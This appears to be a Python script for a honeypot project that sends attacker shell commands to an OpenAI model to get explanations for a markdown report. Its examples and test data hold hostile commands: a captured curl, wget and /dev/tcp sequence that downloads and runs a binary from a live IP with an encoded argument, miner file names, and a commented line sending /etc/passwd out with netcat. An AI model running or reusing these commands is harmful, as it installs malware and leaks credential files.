import os
import pathlib
import json
import ast
import hashlib
import re

from openai import OpenAI
#from openai import ServiceUnavailableError, InvalidRequestError
import openai

OPENAI_API_KEY = os.environ.get('OPENAI_API_KEY')

class OpenAIAnalyzer:
    
    def __init__(self, api_key=OPENAI_API_KEY, model="gpt-4-1106-preview", db_path="tests/aidb") -> None:
        self.client = OpenAI(api_key=OPENAI_API_KEY)
        self.model = model
        self.db_path = pathlib.Path(db_path)
        if not self.db_path.exists():
            self.db_path.mkdir(exist_ok=True, parents=True)

    def get_message_hash(self, messages):
        return hashlib.sha256(str(messages).encode()).hexdigest()
    
    def try_openai(self, getter_fn, parser_fn, **kwargs):
        try:
            response = getter_fn(**kwargs)
            return parser_fn(response)
        except Exception as e:
            if isinstance(e, (openai.OpenAIError)):
                print(e)
                return f'OpenAI Error: {e}'
            else:
                print(e)
                return str(e)    

    def openai_get_chat(self, messages=[], n=1, **kwargs):
        message_hash = self.get_message_hash(messages)
        db_file = self.db_path / f"{message_hash}.json"
        
        if db_file.exists():
            with open(db_file) as f:
                result = json.load(f)["result"]
        else:
            result = self.try_openai(
                getter_fn=self.client.chat.completions.create, 
                parser_fn=lambda response: response.choices[0].message.content.strip(),
                messages=messages, 
                n=n,
                **kwargs)

            with open(db_file, "w+") as f:
                json.dump({"messages": messages, "kwargs": kwargs, "result": result}, f, indent=4)

        return result
    
    def format_commands(self, commands):
        return json.dumps({str(n):cmd for n, cmd in enumerate(commands)}, indent=0)

    def explain_commands(self, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to throughly explain a series commands that were executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object in the following format: {command_index: command_string, ...}.",
        "Output must be a json object with string keys that correspond to command indicies or command ranges, and string values that explain the corresponding command(s).",
        "Output must be in the following format {command_index: explanation_string, ...}."
        "The explanation_string values will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        "You should group adjcent commands into logical groups and explain what the attacker was trying to do with each command.",
        ])
        example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", "cd /usr/bin;chmod +x example.sh", 
                             "./example.sh >> example_output.py", "exec example_output.py || python3 example_output.py &",
                             "ps -ajfx | grep example_output.py", "rm example.sh",  "rm example_output.py", "exit"]
        example_commands1 = self.format_commands(commands)

        example_response1 = {
            "0":"The attacker uses `wget` to **download a shell script** from `http://example.com` saving it as `/usr/bin/example.sh`",
            "1":"The attacker then **changes directories** to `/usr/bin` and makes the script **executable** with `chmod +x example.sh`",
            "2":"The attacker then executes the script with `./example.sh` and **appends the output of the shell script to a new python file named `example_output.py`**",
            "3":"The attacker then **executes the generated python script** `example_output.py` through the `exec` command or in the background`python3 example_output.py &`",
            "4":"The attacker then **lists all processes** and **filters the output** for `example_output.py` with `ps -ajfx | grep example_output.py`",
            "5-6":"The attacker then **removes the shell script** `example.sh` and the python script `example_output.py` with `rm example.sh` and `rm example_output.py`",
            "7":"Finally, the attacker **exits the terminal** with `exit`",
        }

        # example_commands2 = ["cd / && ls -l", "cat /etc/passwd | nc 20.7.1.69 420", "./example.sh >> example_output.py", "e cho 'This command is an error'", "exec example_output.py",]
        # #example_response2 = ['The attacker **changes directories** to the root directory `/` and executes `ls -l` to **list all files and directories**, including their permissions and ownership', 'Then, `cat /etc/passwd` is executed which **displays the content of the `/etc/passwd` file** (which contains user account information) and that content is sent to an external IP address `20.7.1.69` on port `420` using `nc` (netcat), possibly indicating **information leakage** or **data exfiltration**', 'After which, the attacker executes the script `./example.sh` which implies an earlier downloaded or written script is run (possible malicious actions depending on the content of the script)', "Finally, the command `e cho 'This command is an error'` is executed, but this command is flawed. It appears the attacker meant to run an `echo` command but made a typo. However, this could also be an attempt to **create confusion or misdirection** during a forensic analysis of the system."]
        # example_response3 = ['The attacker initially **changes to the root directory** and lists all files and directories with `cd / && ls -l`', 'The attacker then **reads the contents of /etc/passwd**, which contains user account information and sends it to **remote server with IP 20.7.1.69 on port 420** using `netcat (nc)`', 'Next, **appends the output of the executed `example.sh` script to a new python file named `example_output.py`**', 'Attempted to execute **an incorrectly syntaxed echo command**, presumably attempting to add a line of text to the terminal and failing due it being incorrectly formatted', 'Finally, the attacker attempts to **execute the generated python script** `example_output.py` through the `exec` command']

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": self.format_commands(example_commands1)},
            {"role": "assistant", "content": json.dumps(example_response1, indent=0)},
            #{"role": "user", "content": self.format_commands(example_commands2)},
            #{"role": "assistant", "content": str(example_response2)}
            {"role": "user", "content": self.format_commands(commands)}
        ]


        result = self.openai_get_chat(
            model=self.model,
            messages=messages, 
            n=n,
            response_format={ "type": "json_object" },
            **kwargs)

        #result = re.search(r".*(\[.+\]).*", result,flags=re.MULTILINE).groups(0)
        #result = result.strip('`\njson')

        try:
            result = json.loads(result)
        except Exception as e1:
            #print(e)
            try:
                result = ast.literal_eval(result)
            except Exception as e2:
                print(f"Errors {e1} {e2} {result}. Trying again {retries} more times")
                if retries > 0:
                    return self.explain_commands(commands, n, retries - 1, **kwargs)
                else:
                    return f"Errors {e1} {e2} {result}"

        return self.zip_command_explainations(commands, result)

    def zip_command_explainations(self, commands, result):
        if isinstance(result, list):
            if len(result) == len(commands):
                return dict(zip(commands, result))
            else:
                return dict(zip(commands, result))
        
        if isinstance(result, dict):
            if len(result) == len(commands):
                result = [k + v for k,v in result.items()]
                return dict(zip(commands, result))
            
            if all([isinstance(k, int) for k in result.keys()]):  
                return {commands[i]: result.get(i) for i in range(len(commands))}
            
            num_keys_re = re.compile(r"(\d+)\-?(\d*)")
            keys = list(result.keys())    
            if all([num_keys_re.match(k) for k in keys]):
                # last_key = keys[-1]
                # start, end = num_keys_re.match(last_key).groups()
                # last_index = int(end) if end != "" else int(start)
                # offset = 0
                grouped_commands = []
                for k in result.keys():
                    start, end = num_keys_re.match(k).groups()
                    if end == "":
                        i = int(start) #+ offset
                        grouped_commands.append(commands[i])
                    else:
                        start, end = int(start), int(end) #+ offset
                        grouped_commands.append("\n".join(commands[start:end]))

                        #Now start using offset
                        #offset = len(commands) - last_index - 1            

                return dict(zip(grouped_commands, result.values()))

            elif all([isinstance(k, str) for k in keys]):
                return dict(zip(commands, result.values()))



            

        


if __name__ == "__main__":
    oa = OpenAIAnalyzer(OPENAI_API_KEY)
    #example_commands2 = ["cd / && ls -l", "cat /etc/passwd | nc 20.7.1.69 420", "./example.sh >> example_output.py", "e cho 'This command is an error'", "exec example_output.py" ]
    #result = oa.explain_commands(example_commands2)
    
    cmds = ['echo 1 && cat /bin/echo', 'nohup $SHELL -c "curl http://94.230.232.6:60142/linux -o /tmp/f1HcUi057v', 'if [ ! -f /tmp/f1HcUi057v ]; then wget http://94.230.232.6:60142/linux -O /tmp/f1HcUi057v; fi;', "if [ ! -f /tmp/f1HcUi057v ]; then exec 6<>/dev/tcp/94.230.232.6/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/f1HcUi057v && chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==; fi;", 'echo 123456 > /tmp/.opass', 'chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==" &', 'head -c 0 > /tmp/X23ZoPo761', 'chmod 777 /tmp/X23ZoPo761', '/tmp/X23ZoPo761 TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==', 'cp /tmp/X23ZoPo761 /tmp/linux']
    cmds += ['head -c 0 > /tmp/windows', 'head -c 0 > /tmp/windows_sign', 'head -c 0 > /tmp/arm_linux', 'head -c 0 > /tmp/mips_linux', 'head -c 0 > /tmp/mips_linux_sign', 'head -c 0 > /tmp/winminer', 'head -c 0 > /tmp/arm_linux_sign', 'head -c 0 > /tmp/winminer_sign', 'head -c 0 > /tmp/miner_sign', 'head -c 0 > /tmp/miner', 'head -c 0 > /tmp/mipsel_linux', 'head -c 0 > /tmp/mipsel_linux_sign', 'head -c 0 > /tmp/linux_sign', 'exit']
    result = oa.explain_commands(cmds)
    print(result)